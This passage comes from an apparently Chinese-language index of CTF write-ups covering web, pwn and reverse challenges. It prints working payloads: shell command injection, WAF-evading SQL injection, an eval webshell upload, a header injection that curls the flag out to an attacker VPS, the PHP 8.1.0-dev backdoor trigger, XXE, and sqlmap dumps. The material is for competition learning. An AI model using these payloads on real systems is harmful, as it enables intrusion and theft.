puts(\"3.Test your file\");\n  puts(\"4.Exit.\");\n</code></pre></p> <p>\u9009\u62e9\u540e\u7684\u903b\u8f91\u4e3a C<pre><code>      switch ( v3 )\n      {\n        case 3:\n          filemanage();\n          break;\n        case 1:\n          puts(\"Please input index.\");\n          __isoc99_scanf(\"%d\", &amp;v2);\n          puts(\"please input value\");\n          v1 = getchar();\n          getchar();\n          s[v2] = v1;\n          break;\n        case 2:\n          memset(buf, 0, sizeof(buf));\n          memset(command, 0, 0x100uLL);\n          puts(\"Please input your echo command\");\n          read(0, buf, 0xE0uLL);\n          if ( strchr(buf, ';')\n            || strchr(buf, '`')\n            || strchr(buf, '|')\n            || strchr(buf, '/')\n            || strchr(buf, '&amp;')\n            || strstr(buf, \"cat\")\n            || strstr(buf, \"sh\") )\n          {\n            perror(\"Forbidden.\");\n            _exit(-1);\n          }\n          snprintf(command, 0x100uLL, \"%s %s %s\", \"echo '\", buf, \"' string\");\n          system(command);\n          break;\n      }\n</code></pre> Text Only<pre><code>\u770b\u5230\u9009\u98792\u6709\u4e00\u4e2asystem\uff0c\u62fc\u63a5\u8f93\u5165\u7684\u5b57\u7b26\u4e32buf\uff0c\u4f46\u662fbuf\u7981\u7528\u4e86';','`','|','/','&amp;',\"cat\",\"sh\"\n\u6709\u5355\u5f15\u53f7\uff0c\u4e0d\u80fd\u4f7f\u7528\u201c|\u201d\u548c\u201c&amp;\u201d ,\u4e0d\u80fd\u4f7f\u7528\u7ba1\u9053\u7684\u65b9\u5f0f.\n\u6ca1\u6709\u7981\u7528$()\uff0c\n\u53ef\u4ee5\u5229\u7528$()\u8fdb\u884cgetshell\n</code></pre> Bash<pre><code>' \"$(c\\at /flag)\" '\n# \u7b2c\u4e00\u4e2a\u5355\u5f15\u53f7\u95ed\u5408\u524d\u9762\u7684\u5355\u5f15\u53f7\n# \\a \u8f6c\u4e49\u7ed5\u8fc7cat\n</code></pre></p> <p>nc\u8fde\u63a5\u4ee5\u540e\uff0c\u8f93\u51652\uff0c\u8f93\u5165<code>' \"$(c\\at /flag)\" '</code> \u83b7\u5f97flag</p>"},{"location":"CTF/beginCTF/beginctf2024/#reverse_1","title":"reverse","text":""},{"location":"CTF/beginCTF/beginctf2024/#real-checkin-xor","title":"real checkin xor","text":""},{"location":"CTF/beginCTF/beginctf2024/#_13","title":"\u89e3\u9898\u8fc7\u7a0b","text":""},{"location":"CTF/beginCTF/beginctf2024/#_14","title":"\u9898\u76ee\u811a\u672c","text":"<p>Python<pre><code>def verify_func(ciper,key):\n    encrypted = []\n    for i in range(len(ciper)):\n        encrypted.append(ord(ciper[i])^ord(key[i%len(key)]))\n    return encrypted\n\nsecret = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]\nprint(\"\u8fd9\u662f\u4e00\u4e2a\u4fdd\u9669\u7bb1,\u4f60\u80fd\u8f93\u5165\u76f8\u5173\u7684key\u6765\u8fdb\u884c\u89e3\u5bc6\u5417?\")\ninput_line = input(\"\u8bf7\u8f93\u5165key &gt; \")\nif verify_func(input_line,\"ez_python_xor_reverse\") == secret:\n    print(\"\u5bc6\u7801\u6b63\u786e\")\nelse:\n    print(\"\u5bc6\u7801\u9519\u8bef\")\n</code></pre> \u9898\u76ee\u5206\u6790\uff1a</p> <p>secret\u4e3a\u6b63\u786e\u52a0\u5bc6\u540e\u7684\u5bc6\u7801 \u8f93\u5165key\uff0cord\u540e\u4e0e<code>ez_python_xor_reverse</code>\u5f02\u6216 \u5f02\u6216\u662f\u53ef\u9006\u7684\uff0csecret\u4e0e<code>ez_python_xor_reverse</code>\u5f02\u6216\u5c31\u80fd\u5f97\u5230\u539f\u6587</p>"},{"location":"CTF/beginCTF/beginctf2024/#_15","title":"\u89e3\u9898\u811a\u672c","text":"Python<pre><code>secret = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]\nkey = \"ez_python_xor_reverse\"\nencrypted = []\nfor i in range(len(secret)):\n    encrypted.append(secret[i]^ord(key[i%len(key)]))\nprint(encrypted)\nfor i in list(map(chr,encrypted)):\n    print(i,end='')\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#web","title":"WEB","text":""},{"location":"CTF/beginCTF/beginctf2024/#sql","title":"sql\u6559\u5b66\u5c40","text":""},{"location":"CTF/beginCTF/beginctf2024/#flag-pyaload","title":"\u7b2c\u4e00\u6bb5flag-pyaload","text":"Text Only<pre><code>?user='/**/unioN/**/seleselectct/**/\n(seselectlect/**/`3`/**/frfromom/**/\n(sselectelect/**/1,2,3/**/union/**/\nseselectlect/**/*/**/frfromom/**/\nsecret.passwoorrd)a/**/limit/**/1,1)/**/where/**/'1\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#flag-payload","title":"\u7b2c\u4e8c\u6bb5flag(\u9519\u8bef)-payload","text":"Text Only<pre><code>?user='/**/unioN/**/seleselectct/**/grade\n/**/frofromm/**/scoorre/**/where/**/'1\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#flag-payload_1","title":"\u7b2c\u4e8c\u6bb5flag(\u6b63\u786e)-payload","text":"Text Only<pre><code>'/**/unioN/**/seleselectct/**/\n(seselectlect/**/`1`/**/frfromom/**/\n(sselectelect/**/1,2/**/union/**/\nseselectlect/**/*/**/frfromom/**/scoorre/**/)\na/**/limit/**/354,1)/**/where/**/'1\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#-","title":"\u7b2c\u4e8c\u6bb5-\u7206\u7834\u811a\u672c","text":"Python<pre><code>import requests\nfor i in range(10,500):\n    res = requests.get(f\"\"\"\n    http://101.32.220.189:31120/challenge.php?user=\n    '/**/unioN/**/seleselectct/**/(seselectlect/**/`2`\n    /**/frfromom/**/(sselectelect/**/1,2/**/union/**/\n    seselectlect/**/*/**/frfromom/**/scoorre/**/)a/**/limit/**/{i},1)\n    /**/where/**/'1\n    \"\"\")\n    html = res.text\n    name = html.split('\u67e5\u8be2\u7ed3\u679c: ')[1].split('&lt;/div&gt;')[0]  # \u4e0d\u60f3\u7528\u6b63\u5219\n    print(name)\n    if 'beg' in name:\n        print(name,i)\n        exit()\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#flag-payload_2","title":"\u7b2c\u4e09\u6bb5flag-payload","text":"Text Only<pre><code>?user='/**/unioN/**/seleselectct/**/\nloloadad_file('/flag')/**/where/**/'1\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#php","title":"php\u90e8\u5206\u4ee3\u7801","text":"PHP<pre><code>&lt;?php $host = 'localhost';\n$username = 'root';\n$password = 'root';\n$database = 'ctf';\n$conn = new mysqli($host, $username, $password, $database);\nif ($conn-&gt;connect_error) {\n    die(\"\u8fde\u63a5\u5931\u8d25: \" . $conn-&gt;connect_error);\n}\n$query = '';\n$resultText = '';\nfunction waf($input)\n{\n    if (preg_match('/regexp|left|floor|reverse|update|between|=|&gt;|&lt;|and|\\|right|substr|replace|char|&amp;|\\\\\\$|sleep| /i', $input, $matches)) {\n        return array(false, $matches[0]);\n    } else {\n        $pattern = \"/(select|from|load|or)/i\";\n        $input = preg_replace($pattern, '', $input);\n        return array(true, $input);\n    }\n}\nif ($_SERVER[\"REQUEST_METHOD\"] == \"GET\" &amp;&amp; isset($_GET['user'])) {\n    $wafOutput = waf($_GET['user']);\n    if ($wafOutput[0] === false) {\n        $resultText = \"WAF!!!\";\n    }\n}\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#zupload","title":"zupload","text":""},{"location":"CTF/beginCTF/beginctf2024/#_16","title":"\u9898\u76ee","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\nif ($_SERVER['REQUEST_METHOD'] == 'GET') {\n    if (!isset($_GET['action'])) {\n        header('Location: /?action=upload');\n        die();\n    }\n    die(file_get_contents($_GET['action']));\n} else if ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    echo json_encode(array(\n        'status' =&gt; 'error',\n        'message' =&gt; 'Not implemented yet'\n    ));\n}\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#_17","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>file_get_contents \u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6 payload\uff1a<code>?action=file:///flag</code></p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro","title":"zupload-pro","text":""},{"location":"CTF/beginCTF/beginctf2024/#_18","title":"\u9898\u76ee","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\nif ($_SERVER['REQUEST_METHOD'] == 'GET') {\n    if (!isset($_GET['action'])) {\n        header('Location: /?action=upload');\n        die();\n    }\n    if ($_GET['action'][0] === '/' || strpos($_GET['action'], '..') !== false) {\n        die('&lt;h1&gt;Invalid action&lt;/h1&gt;');\n    }\n    die(file_get_contents($_GET['action']));\n} else if ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $file = $_FILES['file'];\n    $file_name = $file['name'];\n    $file_tmp = $file['tmp_name'];\n    $file_size = $file['size'];\n    $file_error = $file['error'];\n\n    if ($file_error === 0) {\n        if ($file_size &lt;= 2097152) {\n            $file_destination = 'uploads/' . $file_name;\n\n            if (move_uploaded_file($file_tmp, $file_destination)) {\n                echo json_encode(array(\n                    'status' =&gt; 'ok',\n                    'message' =&gt; 'File uploaded successfully',\n                    'url' =&gt; preg_split('/\\?/', $_SERVER['HTTP_REFERER'])[0] . $file_destination\n                ));\n            }\n        }\n    } else {\n        echo json_encode(array(\n            'status' =&gt; 'error',\n            'message' =&gt; 'File upload failed'\n        ));\n    }\n}\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#_19","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>file_get_contents \u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6 payload\uff1a<code>?action=file:///flag</code></p> <p>file_get_contents \u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6 \u52a0\u4e86\u9650\u5236\uff0c\u4f46\u6ca1\u5565\u7528 <code>($_GET['action'][0] === '/' || strpos($_GET['action'], '..') !== false)</code> \u5982\u679c\u53c2\u6570 action \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u659c\u6760 (/) \u6216\u8005\u53c2\u6570\u4e2d\u5305\u542b\u53cc\u70b9 (..)\uff0c\u5219\u6761\u4ef6\u6210\u7acb</p> <p>payload\uff1a<code>?action=file:///flag</code></p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro-plus","title":"zupload-pro-plus","text":""},{"location":"CTF/beginCTF/beginctf2024/#_20","title":"\u9898\u76ee","text":"PHP<pre><code>&lt;?php\nerror_reporting(0);\nif ($_SERVER['REQUEST_METHOD'] == 'GET') {\n    if (!isset($_GET['action'])) {\n        header('Location: /?action=upload');\n        die();\n    }\n    if ($_GET['action'][0] === '/' || strpos($_GET['action'], '..') !== false) {\n        die('&lt;h1&gt;Invalid action&lt;/h1&gt;');\n    }\n    die(file_get_contents($_GET['action']));\n} else if ($_SERVER['REQUEST_METHOD'] == 'POST') {\n    $file = $_FILES['file'];\n    $file_name = $file['name'];\n    $file_tmp = $file['tmp_name'];\n    $file_size = $file['size'];\n    $file_error = $file['error'];\n\n    $file_ext = explode('.', $file_name);\n    $file_ext = strtolower($file_ext[1]);\n\n    $allowed = array('zip');\n\n    if (in_array($file_ext, $allowed)) {\n        if ($file_error === 0) {\n            if ($file_size &lt;= 2097152) {\n                $file_destination = 'uploads/' . $file_name;\n\n                if (move_uploaded_file($file_tmp, $file_destination)) {\n                    echo json_encode(array(\n                        'status' =&gt; 'ok',\n                        'message' =&gt; 'File uploaded successfully',\n                        'url' =&gt; preg_split('/\\?/', $_SERVER['HTTP_REFERER'])[0] . $file_destination\n                    ));\n                }\n            }\n        }\n    } else {\n        echo json_encode(array(\n            'status' =&gt; 'error',\n            'message' =&gt; 'Only zip files are allowed'\n        ));\n    }\n}\n</code></pre>"},{"location":"CTF/beginCTF/beginctf2024/#_21","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>file_get_contents \u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6 \u52a0\u4e86\u9650\u5236\uff0c\u4f46\u6ca1\u5565\u7528 <code>($_GET['action'][0] === '/' || strpos($_GET['action'], '..') !== false)</code> \u5982\u679c\u53c2\u6570 action \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u662f\u659c\u6760 (/) \u6216\u8005\u53c2\u6570\u4e2d\u5305\u542b\u53cc\u70b9 (..)\uff0c\u5219\u6761\u4ef6\u6210\u7acb \u8fd8\u52a0\u4e86\u4e2a\u53ea\u80fd\u4e0a\u4f20zip\u7684\u9650\u5236\uff0c\u4f46\u6ca1\u5565\u7528</p> <p>payload\uff1a<code>?action=file:///flag</code></p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro-plus-enhanced","title":"zupload-pro-plus-enhanced","text":""},{"location":"CTF/beginCTF/beginctf2024/#_22","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p><code>($_GET['action'][0] === '/' || substr_count($_GET['action'], '/') &gt; 1)</code></p> <p>action \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u662f\u659c\u6760 (/) \u53c2\u6570\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a/ </p> <p>\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6\u4e86</p> <p>\u67e5\u770b\u4ee3\u7801 PHP<pre><code>    $file_ext = explode('.', $file_name);\n    $file_ext = strtolower($file_ext[1]);\n\n    $allowed = array('zip');\n</code></pre> \u8fd9\u91cc\uff0c\u53ea\u5bf9\u6587\u4ef6\u540d\u4ee5\u70b9\u5207\u5272\uff0c\u7b2c2\u6bb5\u8fdb\u884c\u5224\u65ad.\u53ef\u4ee5\u4e0a\u4f20\u4e00\u53e5\u8bdd\uff0c\u6587\u4ef6\u540d\u4e3ashell.zip.php</p> PHP<pre><code>&lt;&lt;&lt;&lt;&lt;\n----\n&lt;?php @eval ($_REQUEST ['cmd']);?&gt;\n</code></pre> <p>\u6709\u5751\u70b9\u7684\u662f\u8fd9\u4e2a\u6709\u524d\u7aef\u9a8c\u8bc1\u540e\u7f00\uff08\u5751\u4e86\u6211\u597d\u4e45\uff09\uff0c</p> <p>\u8bbf\u95ee/uploads/shell.zip.php?cmd=system('cat /f*'); \u83b7\u5f97flag\u3002</p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro-plus-max","title":"zupload-pro-plus-max","text":""},{"location":"CTF/beginCTF/beginctf2024/#_23","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p><code>($_GET['action'][0] === '/' || substr_count($_GET['action'], '/') &gt; 1)</code></p> <p>action \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e0d\u80fd\u662f\u659c\u6760 (/) \u53c2\u6570\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a/ </p> <p>\u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6</p> <p>\u4f46\u662f\u6362\u6210\u4e86<code>include($_GET['action'])</code></p> <p>\u67e5\u770b\u4ee3\u7801 PHP<pre><code>    $file_ext = explode('.', $file_name);\n    $file_ext = strtolower(end($file_ext));\n    $allowed = array('zip');\n</code></pre> \u8fd9\u91cc\uff0c\u53ea\u5bf9\u6587\u4ef6\u540d\u4ee5\u70b9\u5207\u5272\uff0c\u5224\u65ad\u6700\u540e\u4e00\u4f4d.\u53ef\u4ee5\u4e0a\u4f20\uff0c\u6587\u4ef6\u540d\u4e3ashell.zip</p> PHP<pre><code>&lt;&lt;&lt;&lt;&lt;\n----\n&lt;?php @eval ($_REQUEST ['cmd']);?&gt;\n</code></pre> <p>\u8bbf\u95ee?action=uploads/shell.zip?cmd=system('cat /f*');</p> <p>\u83b7\u5f97flag\u3002</p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro-plus-max-ultra","title":"zupload-pro-plus-max-ultra","text":""},{"location":"CTF/beginCTF/beginctf2024/#_24","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u76f8\u6bd4\u524d\u9762\u7684\u4ee3\u7801\uff0c\u6ca1\u4ec0\u4e48\u6f0f\u6d1e\uff0c\u4f46\u662f\u4ed6\u6dfb\u52a0\u4e86\u4e00\u4e2a<code>exec('unzip ' . $file_tmp . ' -d ' . $extract_to);</code> \u5176\u4e2d<code>$extract_to</code> \u662f\u53ef\u4ee5\u901a\u8fc7<code>$_SERVER['HTTP_X_EXTRACT_TO']</code> \u63a7\u5236</p> <p>\u53ea\u8981\u5728http\u7684header\u4e2d \u6dfb\u52a0 X-Extract-To: | curl x.x.x.x/?flag=<code>cat /f*</code></p> <p>\u5728vps\u4e2d\u5f00\u542fhttp\u670d\u52a1\u76d1\u542c80\u7aef\u53e3\uff0c\u8bf7\u6c42\u9776\u673a\u540e\uff0c\u9776\u673a\u5c06flag\u643a\u5e26\u8fdb\u5165vps\u4e2d\uff0c</p> <p>\u83b7\u5f97flag\u3002</p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro-plus-max-ultra-premium","title":"zupload-pro-plus-max-ultra-premium","text":""},{"location":"CTF/beginCTF/beginctf2024/#_25","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>\u524d\u9762\u7684exec \u4e5f\u88ab\u5c01\u5835\u4e86 \u552f\u4e00\u7684\u53d8\u91cf\u4e5f\u88abescapeshellarg \u4e86</p> <p>\u53d1\u73b0\u4ee3\u7801\u5bf9\u6587\u4ef6\u8fdb\u884c\u4e86\u89e3\u538b\u64cd\u4f5c</p> <p>\u53ef\u4ee5\u5c06\u8f6f\u94fe\u63a5\u538b\u7f29\uff0c\u89e3\u538b\u540e\u8fd8\u662f\u8f6f\u94fe\u63a5\uff0c\u8bbf\u95ee\u6587\u4ef6\uff0c</p> Bash<pre><code>ln -s /flag f.txt\nzip -ry shell.zip f.txt\n</code></pre> <p>\u5c06\u5236\u4f5c\u7684shell.zip\u4e0a\u4f20\uff0c \u4e0b\u8f7d/uploads/f.txt \u5c31\u80fd\u83b7\u5f97flag\u3002</p>"},{"location":"CTF/beginCTF/beginctf2024/#zupload-pro-revenge","title":"zupload-pro-revenge","text":""},{"location":"CTF/beginCTF/beginctf2024/#_26","title":"\u89e3\u9898\u8fc7\u7a0b","text":"<p>file_get_contents \u4e0d\u80fd\u76f4\u63a5\u8bfb\u53d6\u6587\u4ef6 \u52a0\u4e86\u9650\u5236\uff0c <code>($_GET['action'][0] === '/' || substr_count($_GET['action'], '/') &gt; 1)</code></p> <p>\u4f46\u662f\u6ca1\u6709\u5bf9\u4e0a\u4f20\u7684\u6587\u4ef6\u8fdb\u884c\u9650\u5236</p> <p>\u53ef\u4ee5\u4e0a\u4f20\u4e00\u53e5\u8bdd\uff0c\u6587\u4ef6\u540d\u4e3ashell.php</p> PHP<pre><code>&lt;&lt;&lt;&lt;&lt;\n----\n&lt;?php @eval ($_REQUEST ['cmd']);?&gt;\n</code></pre> <p>\u8bbf\u95ee/uploads/shell.php?cmd=system('cat /f*');</p> <p>\u83b7\u5f97flag\u3002</p>"},{"location":"CTF/hscctf/hscctf%232024/","title":"HSCCTF2024writeup","text":"<p>hescctf.com</p>"},{"location":"CTF/hscctf/hscctf%232024/#web","title":"web","text":"<p>fffff</p>"},{"location":"CTF/hscctf/hscctf%232024/#_1","title":"HSCCTF2024writeup","text":"<p>asd fffawefjj</p>"},{"location":"CTF/qsnctf/qsnctf%232024round1/","title":"qsnctf#2024round1","text":""},{"location":"CTF/qsnctf/qsnctf%232024round1/#web","title":"Web","text":""},{"location":"CTF/qsnctf/qsnctf%232024round1/#easymd5","title":"EasyMD5","text":"<p>\u9898\u76ee\u63cf\u8ff0\uff1aphp\u6ca1\u6709\u96be\u9898  \u9898\u76ee\u9700\u8981\u63d0\u4ea4\u4e24\u4e2apdf\u6587\u4ef6\uff0c\u6839\u636e\u9898\u540d\u77e5\u9053\uff0c\u9700\u8981\u4e24\u4e2amd5\u503c\u76f8\u540c\u7684\u6587\u4ef6 \u4f7f\u7528fastcoll\u8fd9\u4e2a\u5de5\u5177\uff0c\u8fd9\u4e2a\u5de5\u5177\u53ef\u4ee5\u5bf9\u6587\u4ef6\u7684md5\u8fdb\u884c\u78b0\u649e\uff0c Bash<pre><code>$ wine fastcoll_v1.0.0.5.exe 1.pdf\nMD5 collision generator v1.5\nby Marc Stevens (http://www.win.tue.nl/hashclash/)\n\nUsing output filenames: '1_msg1.pdf' and '1_msg2.pdf'\nUsing prefixfile: '1.pdf'\nUsing initial value: fc973272a5af2bc4d379714aeecefc9b\n\nGenerating first block: ............\nGenerating second block: W.............\nRunning time: 4.163 s\n\n$ ls\n1_msg1.pdf  1_msg2.pdf  1.pdf  fastcoll_v1.0.0.5.exe\n</code></pre> \u4e0a\u4f20\u6210\u529f\uff0c\u9875\u9762\u52a0\u8f7d\u4e00\u79d2\u540e\u4f1a\u8df3\u8f6c.\u4ee3\u7801\u4e2d\u6709\u4e00\u6bb5 <code>&lt;meta http-equiv=\"refresh\" content=\"1;url=index.html\"&gt;</code> \u4f1a\u8df3\u8f6c\u5230index.html . \u63d0\u524d\u628a<code>f12</code>\u5f00\u53d1\u8005\u5de5\u5177\u6253\u5f00\uff0c\u76d1\u542c\u7f51\u7edc\uff0c\u52fe\u9009\u6301\u7eed\u8bb0\u5f55\u3002\u628a\u751f\u6210\u7684<code>1_msg1.pdf</code>\u548c<code>1_msg2.pdf</code>\u4e0a\u4f20\uff0c\u54cd\u5e94\u5305\u4e2d\u65e2\u53ef\u83b7\u5f97flag </p>"},{"location":"CTF/qsnctf/qsnctf%232024round1/#php","title":"PHP\u7684\u540e\u95e8","text":"<p>\u9898\u76ee\u63cf\u8ff0\uff1aPHP\u7adf\u7136\u4e5f\u4f1a\u6709\u540e\u95e8\u8fd9\u79cd\u4e1c\u897f\uff1f\u4f60\u77e5\u9053\u5417\uff01</p> <p>\u6253\u5f00\u9898\u76ee\u63d0\u793a\uff1a Text Only<pre><code>\u6b22\u8fce\u6765\u5230\u8fd9\u91cc\uff01\n\u8bf7\u5408\u7406\u4f7f\u7528\u5f53\u524d\u5185\u5bb9\u83b7\u5f97FLAG\uff01\n\u4f60\u5e94\u8be5\u77e5\u9053\u8fd9\u662f\u54ea\u4e2a\u7248\u672c\u7684PHP\u5427\uff01\n</code></pre> \u67e5\u770b\u54cd\u5e94\u5305\u7684http\u5934\u90e8\uff0c\u53ef\u77e5php\u7248\u672c\u4e3a<code>PHP/8.1.0-dev</code></p> <p>\u8fd9\u4e2a\u7248\u672c\u7684php\u6709\u4e2a\u540e\u95e8\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c  HTTP<pre><code> User-Agentt : zerodiumsystem('cat /flag');\n</code></pre></p>"},{"location":"CTF/qsnctf/qsnctf%232024round1/#phpxxe","title":"PHP\u7684XXE","text":"<p>\u9898\u76ee\u63cf\u8ff0 XXE\uff08XML External Entity\uff09\u662f\u4e00\u79cd\u9488\u5bf9XML\u89e3\u6790\u5668\u7684\u653b\u51fb\u6280\u672f\uff0c\u4e5f\u88ab\u79f0\u4e3aXML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u653b\u51fb\u3002\u5f53\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790\u7528\u6237\u63d0\u4f9b\u7684XML\u8f93\u5165\u65f6\uff0c\u5982\u679c\u6ca1\u6709\u6b63\u786e\u5730\u914d\u7f6e\u6216\u8fc7\u6ee4\u5916\u90e8\u5b9e\u4f53\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u6f0f\u6d1e\u6267\u884c\u6076\u610f\u64cd\u4f5c\u3002 XML\u5141\u8bb8\u5728\u6587\u6863\u4e2d\u5b9a\u4e49\u548c\u4f7f\u7528\u5916\u90e8\u5b9e\u4f53\uff0c\u8fd9\u4e9b\u5b9e\u4f53\u53ef\u4ee5\u4ece\u5916\u90e8\u8d44\u6e90\uff08\u5982\u6587\u4ef6\u3001\u7f51\u7edcURL\u7b49\uff09\u4e2d\u83b7\u53d6\u6570\u636e\u3002\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u89e3\u6790\u4e86\u5305\u542b\u6076\u610f\u5916\u90e8\u5b9e\u4f53\u7684XML\u8f93\u5165\uff0c\u5e76\u4e14\u672a\u5bf9\u5916\u90e8\u5b9e\u4f53\u8fdb\u884c\u9002\u5f53\u7684\u5904\u7406\u6216\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8bfb\u53d6\u654f\u611f\u6587\u4ef6\u3001\u6267\u884c\u8fdc\u7a0b\u4ee3\u7801\u6216\u8fdb\u884c\u5176\u4ed6\u6076\u610f\u6d3b\u52a8\u3002</p> <p>\u770b\u4e0d\u61c2\u9898\u76ee  \u641c\u7d22 \u5173\u952e\u8bcd phpinfo xxe</p> <p>\u627e\u5230\u6587\u7ae0PHP\u73af\u5883 XML\u5916\u90e8\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e\uff08XXE\uff09</p> <p>\u6839\u636e\u6587\u7ae0\u63d0\u793a\u7684 <code>dom.php</code> \u53d1\u9001payload XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///flag\" &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n</code></pre>  \u8fd9\u9898\u6ca1\u641e\u61c2\uff0c\u4e3a\u5565\u4f1a\u6709\u5176\u4ed6php\u6587\u4ef6 Bash<pre><code>$ tree .\n.\n\u251c\u2500\u2500 dom.php # \u793a\u4f8b\uff1a\u4f7f\u7528DOMDocument\u89e3\u6790body\n\u251c\u2500\u2500 index.php\n\u251c\u2500\u2500 SimpleXMLElement.php # \u793a\u4f8b\uff1a\u4f7f\u7528SimpleXMLElement\u7c7b\u89e3\u6790body\n\u2514\u2500\u2500 simplexml_load_string.php # \u793a\u4f8b\uff1a\u4f7f\u7528simplexml_load_string\u51fd\u6570\u89e3\u6790body\n</code></pre></p>"},{"location":"CTF/qsnctf/qsnctf%232024round1/#easy_sqli","title":"Easy_SQLi","text":"<p>\u9898\u76ee\u63cf\u8ff0: Easy\u7684SQLi</p> <p>\u6253\u5f00\u9898\u76ee\u662f\u4e2a\u767b\u5f55\u6846 </p> <p>sqlmap \u81ea\u52a8\u5bfb\u627e\u6ce8\u5165\u70b9 Bash<pre><code>sqlmap -u 'http://challenge.qsnctf.com:32522/' --form --batch\n</code></pre> \u6ce8\u5165\u6210\u529f\uff0c\u53ea\u80fd\u65f6\u95f4\u76f2\u6ce8\u3002 \u6ca1\u6709waf\uff0c\u67e5\u627e\u4e00\u6bb5\u65f6\u95f4\u7684\u6570\u636e\uff0c\u53d1\u73b0flag\u5728users\u8868\u4e2d\u7684password\u5b57\u6bb5\uff0c Bash<pre><code>sqlmap -u 'http://challenge.qsnctf.com:32522/' --form -D qsnctf -T users -C password --dump --batch\n</code></pre>  \u83b7\u5f97flag</p>"},{"location":"CTF/qsnctf/qsnctf%232024round1/#_1","title":"\u96cf\u5f62\u7cfb\u7edf","text":"<p>\u9898\u76ee\u63cf\u8ff0: \u4eca\u5929\u662f\u516c\u53f8\u91cc\u7684\u5de5\u7a0b\u5e08\u5c0f\u738b\u88ab\u88c1\u5458\u7684\u65e5\u5b50\uff0c\u4f46\u5c0f\u738b\u5e76\u6ca1\u6709\u95f2\u7740\u3002\u5728\u79bb\u5f00\u4e4b\u524d\uff0c\u4ed6\u7a81\u53d1\u5947\u60f3\uff0c\u51b3\u5b9a\u7559\u4e0b\u4e00\u4efd\u7279\u522b\u7684\u793c\u7269\u7ed9\u516c\u53f8\uff0c\u4e8e\u662f\u4ed6\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u767b\u5f55\u9875\u9762\u7684\u96cf\u5f62\u3002 </p> <p>dirsearch \u626b\u63cf Bash<pre><code>$ dirsearch -u http://challenge.qsnctf.com:31493/ -e php \n\n  _|. _ _  _  _  _ _|_    v0.4.3.post1\n (_||| _) (/_(_|| (_| )\n\nExtensions: php | HTTP method: GET | Threads: 25\nWordlist size: 9411\n\nOutput File: /home/anjv/reports/http_challenge.qsnctf.com_31493/__24-03-02_16-22-57.txt\n\nTarget: http://challenge.qsnctf.com:31493/\n\n[16:22:57] Starting: \n[16:23:27] 200 -    2KB - /www.zip\n\nTask Completed\n</code></pre> \u626b\u63cf\u5230www.rar\u6587\u4ef6 \u4e0b\u8f7d\u89e3\u538b\uff0c\u6709\u4e2asqnctf.php\u6587\u4ef6\uff0c\u53bb\u6389\u6df7\u6dc6\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a</p>  \u5c55\u5f00\u4ee3\u7801  PHP<pre><code>&lt;?php\n    error_reporting(0);\n    class shi\n    {\n        public $next;\n        public $pass;\n        public function __toString(){\n            $this-&gt;next::PLZ($this-&gt;pass);\n        }\n    }\n    class wo\n    {\n        public $sex;\n        public $age;\n        public $intention;\n        public function __destruct(){\n            echo \"Hi Try serialize Me!\\n\";\n            $this-&gt;inspect();\n        }\n        function inspect(){\n            if($this-&gt;sex=='boy'&amp;&amp;$this-&gt;age=='eighteen')\n            {\n                echo 